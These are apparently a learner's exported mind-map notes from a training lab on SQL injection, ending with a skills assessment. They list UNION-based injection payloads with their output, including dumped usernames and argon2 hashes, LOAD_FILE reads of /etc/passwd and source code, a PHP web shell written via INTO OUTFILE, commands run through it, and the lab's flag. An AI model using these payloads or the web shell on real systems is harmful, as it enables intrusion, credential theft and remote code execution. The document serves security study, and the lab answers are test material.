---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "1"
module: "SQL Injection Fundamentals"
output_topics: 40
---

# SQL Injection Fundamentals — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> | id | username | password | date_of_joining     |
> +----+----------+----------+---------------------+
> |  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
>
> **Source path:** SQL Injection Fundamentals → mysql → mysql -u root -h 94.237.55.38 -P 35946 -p → SELECT * FROM logins WHERE username like '___'; → | id | username | password | date_of_joining     |  +----+----------+----------+---------------------+  |  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 786d01f7-7439-41d1-9d7c-d359abf231c3 -->

> [!output]+ 🟨 Output 002
> ilfreight
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → determine which one used by webserver to get the ports → cn' UNION select 1,database(),2,3-- - → ilfreight
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3d88e407-87ea-4a4b-8c3d-8d28e38323d0 -->

> [!output]+ 🟨 Output 003
> dev
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → determine which one used by webserver to get the ports → cn' UNION select 1,database(),2,3-- - → dev
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3ea8b901-fcb6-43b0-9776-d95cb5dd8c0b -->

> [!output]+ 🟨 Output 004
> username
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → dump the data of the credentials table → we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA → cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - → username
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 07653a87-79a9-4401-b8d7-8bc3383cadfe -->

> [!output]+ 🟨 Output 005
> password
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → dump the data of the credentials table → we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA → cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - → password
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 518e3d87-fc67-4aa1-93b1-e767b8cd5c58 -->

> [!output]+ 🟨 Output 006
> ilfreight
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - → ilfreight
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6a426f4b-34fc-45d0-8541-7387e858a030 -->

> [!output]+ 🟨 Output 007
> users
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- - → users
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d097d41d-f109-43b1-b6a5-eebfa8e0a269 -->

> [!output]+ 🟨 Output 008
> product
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- - → product
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bf3b1df0-cead-494e-9b6f-056365366e32 -->

> [!output]+ 🟨 Output 009
> ports
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- - → ports
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4436e113-c378-42d3-bd1f-d94e919ffbb3 -->

> [!output]+ 🟨 Output 010
> username
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- - → username
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 83f15d48-d944-4d4c-8c8a-6ab32814f15d -->

> [!output]+ 🟨 Output 011
> password
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- - → password
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 05c3bc24-36c9-4d1e-b4f1-9bc5bb1e57a6 -->

> [!output]+ 🟨 Output 012
> newuser | Hash_Value
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Database Enumeration → UNION information_schema → LAB → cn' UNION select 1, username, password, 4 from ilfreight.users-- - → newuser | Hash_Value
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 32001d30-9158-4314-8417-421fc94436d1 -->

> [!output]+ 🟨 Output 013
> root'@'localhost
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Reading Files → Privileges → Our UNION injection payload will be → cn' UNION SELECT 1, user(), 3, 4-- - → root'@'localhost
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3f206e6b-8bc3-4659-9178-667c120fd755 -->

> [!output]+ 🟨 Output 014
> SELECT
> INSERT
> UPDATE
> DELETE
> CREATE
> DROP
> RELOAD
> SHUTDOWN
> PROCESS
> FILE
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Reading Files → Privileges → dump other privileges we have directly from the schema → cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- - → cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - → SELECT INSERT UPDATE DELETE CREATE DROP RELOAD SHUTDOWN PROCESS FILE
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 12c2137e-2534-4e5f-aae2-19501648e5f6 -->

> [!output]+ 🟨 Output 015
> root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Reading Files → LOAD_FILE → LOAD_FILE() function can be used in MariaDB / MySQL → using a UNION injection → cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - → root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2d91600c-4fb1-4659-ae53-9f049419ef26 -->

> [!output]+ 🟨 Output 016
> include "config.php";
> ?&gt;
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Reading Files → LOAD_FILE → LOAD_FILE() function can be used in MariaDB / MySQL → using a UNION injection → cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- - → [Ctrl + U] → The source code shows us the entire PHP code → include "config.php"; ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6cd101d6-ff97-486e-b887-c0c91403e04b -->

> [!output]+ 🟨 Output 017
> &lt;?php
> if (isset($_GET["port_code"])) {
> $q = "Select * from ports where code like '%".$_GET["port_code"]."%'";
>
> $result = mysqli_query($conn,$q);
> if (!$result)
> {
> 		die("&lt;/table&gt;&lt;/div&gt;&lt;p style='font-size: 15px'&gt;".mysqli_error($conn)."&lt;/p&gt;");
> }
> while($row = mysqli_fetch_array($result))
>   {
>   echo "&lt;tr&gt;&lt;td style=\"width:400px\" colspan=3&gt;".$row[1]."&lt;/td&gt;&lt;td style=\"width:400px\" colspan=3&gt;".$row[2]."&lt;/td&gt;&lt;td style=\"width:450px\" colspan=3&gt;".$row[3]."&lt;/tr&gt;";
>   }
> }
> ?&gt;
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Reading Files → LOAD_FILE → LOAD_FILE() function can be used in MariaDB / MySQL → using a UNION injection → cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- - → [Ctrl + U] → The source code shows us the entire PHP code → &lt;?php if (isset($_GET["port_code"])) { $q = "Select * from ports where code like '%".$_GET["port_code"]."%'";  $result = mysqli_query($conn,$q); if (!$result) { 		die("&lt;/table&gt;&lt;/div&gt;&lt;p style='font-size: 15px'&gt;".mysqli_error($conn)."&lt;/p&gt;"); } while($row = mysqli_fetch_array($result))   {   echo "&lt;tr&gt;&lt;td style=\"width:400px\" colspan=3&gt;".$row[1]."&lt;/td&gt;&lt;td style=\"width:400px\" colspan=3&gt;".$row[2]."&lt;/td&gt;&lt;td style=\"width:450px\" colspan=3&gt;".$row[3]."&lt;/tr&gt;";   } } ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8139359a-0557-4ffe-8a6b-6be8d67710e0 -->

> [!output]+ 🟨 Output 018
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** SQL Injection Fundamentals → SQL Injection → Writing Files → Writing a Web Shell → UNION injection payload → cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- - → http://SERVER_IP:PORT/shell.php?0=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e8368ecc-2558-475d-b93b-b9c2b51ce1d0 -->

> [!output]+ 🟨 Output 019
> 3
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → After login → We have chats with many users the user named @chatter i choose to speak to → search in chat function → try malicious payloads → found working payload → something')union select 1,2,3,4# → 3
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d5bddcd8-8332-4afa-9c69-c2351ea394b1 -->

> [!output]+ 🟨 Output 020
> 10.11.11-MariaDB-0+deb12u1
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → After login → We have chats with many users the user named @chatter i choose to speak to → search in chat function → try malicious payloads → found working payload → something')union select 1,2,3,4# → 3 → now replace 3 → something')union select 1,2,@@version,4# → 10.11.11-MariaDB-0+deb12u1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5acadd21-72da-49d9-8e69-f7838a92511d -->

> [!output]+ 🟨 Output 021
> information_schema
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the schema name → something')union select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA# → information_schema
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b09b3f50-7006-45bd-b7c5-ed2a1ed1e1e2 -->

> [!output]+ 🟨 Output 022
> InvitationCodes
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the tables name → something')union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'# → InvitationCodes
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 33cc977e-b072-4e55-abfa-2a8ade56cfc3 -->

> [!output]+ 🟨 Output 023
> Messages
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the tables name → something')union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'# → Messages
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 02ded1fc-e06d-400c-80ff-5e3f21a13752 -->

> [!output]+ 🟨 Output 024
> UserID
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the columns name → something')union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'# → UserID
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0433dc46-83c9-4535-a3f4-51b7272f711e -->

> [!output]+ 🟨 Output 025
> InvitationCode
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the columns name → something')union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'# → InvitationCode
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5be64635-0bca-4f96-96ae-c00a7366bfc9 -->

> [!output]+ 🟨 Output 026
> AccountCreated
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → get the columns name → something')union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'# → AccountCreated
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 587c9e4a-11e1-4bc3-920a-3686d6ad6925 -->

> [!output]+ 🟨 Output 027
> aadmin' or '1'='1
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract usernsnames → something')UNION select 1, 2, Username, 4 from chattr.Users# → aadmin' or '1'='1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 82cbba08-59e1-415a-b92f-eafcc70b8fbe -->

> [!output]+ 🟨 Output 028
> aadmin') or '1'='1'#
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract usernsnames → something')UNION select 1, 2, Username, 4 from chattr.Users# → aadmin') or '1'='1'#
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 74ca1ecc-dcbd-45f5-9c79-f2148c748425 -->

> [!output]+ 🟨 Output 029
> aadmin') or ('1'='1
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract usernsnames → something')UNION select 1, 2, Username, 4 from chattr.Users# → aadmin') or ('1'='1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7cb7cd85-fa12-4f81-b637-00370cd6787d -->

> [!output]+ 🟨 Output 030
> aadmin'or 1=1 or ''='
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract usernsnames → something')UNION select 1, 2, Username, 4 from chattr.Users# → aadmin'or 1=1 or ''='
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a15c53b4-8521-4232-934a-5bafecb1121f -->

> [!output]+ 🟨 Output 031
> $argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract the hash → something')UNION select 1, 2, Password, 4 from chattr.Users# → $argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 751c8e82-a025-48a1-a0cd-bd8a3b77b345 -->

> [!output]+ 🟨 Output 032
> $argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract the hash → something')UNION select 1, 2, Password, 4 from chattr.Users# → $argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7c119273-60d6-410a-bf04-9ca7ea101192 -->

> [!output]+ 🟨 Output 033
> $argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract the hash → something')UNION select 1, 2, Password, 4 from chattr.Users# → $argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 584a4e3f-adb4-4ac1-b660-3b15b029ba4b -->

> [!output]+ 🟨 Output 034
> $argon2i$v=19$m=2048,t=4,p=3$U1NXS3ZhSENPaExsZFJBaw$lKPqFXoVbBaFDchKsdfDdR5UKXedIhzcJw0R3sZMbfM
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → get the hash of admin user → read the database → extract the hash → something')UNION select 1, 2, Password, 4 from chattr.Users# → $argon2i$v=19$m=2048,t=4,p=3$U1NXS3ZhSENPaExsZFJBaw$lKPqFXoVbBaFDchKsdfDdR5UKXedIhzcJw0R3sZMbfM
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9a537301-820e-4c8e-b156-bd2146f1c4d4 -->

> [!output]+ 🟨 Output 035
> /var/lib/mysql/
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → what is the path of web application ? → Database path → something')UNION select 1, 2, @@datadir, 4 from chattr.Users# → /var/lib/mysql/
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 56015fcd-bade-4f99-960e-89589a059698 -->

> [!output]+ 🟨 Output 036
> ..../var/www/chattr-prod.....
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → what is the path of web application ? → web server configuration file → something')UNION select 1, 2, LOAD_FILE('/etc/nginx/sites-enabled/default'), 4 from chattr.Users# → ..../var/www/chattr-prod.....
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0cf9bbab-e1cf-4bd7-883b-b0bdfd42f6a4 -->

> [!output]+ 🟨 Output 037
> something')UNION select 1, 2,'&lt;?php system($_REQUEST[0]); ?&gt;', 4 into outfile '/var/www/chattr-prod/shell.php'#
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → Achive RCE and get the flag → something')UNION select 1, 2,'&lt;?php system($_REQUEST[0]); ?&gt;', 4 into outfile '/var/www/chattr-prod/shell.php'#
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ddfc40ca-cc66-4286-bdca-29fd56f11bfe -->

> [!output]+ 🟨 Output 038
> uid=33(www-data) gid=33(www-data) groups=33(www-data) 4
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → Achive RCE and get the flag → something')UNION select 1, 2,'&lt;?php system($_REQUEST[0]); ?&gt;', 4 into outfile '/var/www/chattr-prod/shell.php'# → https://83.136.254.49:43385/shell.php?0=id → uid=33(www-data) gid=33(www-data) groups=33(www-data) 4
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fd1b7e70-fc49-410c-b8f8-fd783871afa1 -->

> [!output]+ 🟨 Output 039
> flag_876a4c.txt
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → Achive RCE and get the flag → something')UNION select 1, 2,'&lt;?php system($_REQUEST[0]); ?&gt;', 4 into outfile '/var/www/chattr-prod/shell.php'# → https://83.136.254.49:43385/shell.php?0=ls+/ → flag_876a4c.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6b387e79-dca0-40af-a984-4e8836d9b807 -->

> [!output]+ 🟨 Output 040
> 061b1aeb94dec6bf5d9c27032b3c1d8d
>
> **Source path:** SQL Injection Fundamentals → Skills Assessment → Achive RCE and get the flag → something')UNION select 1, 2, LOAD_FILE("/flag_876a4c.txt"), 4 from chattr.Users# → 061b1aeb94dec6bf5d9c27032b3c1d8d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b34d98d6-f011-4a19-b79b-8df97cd7870d -->
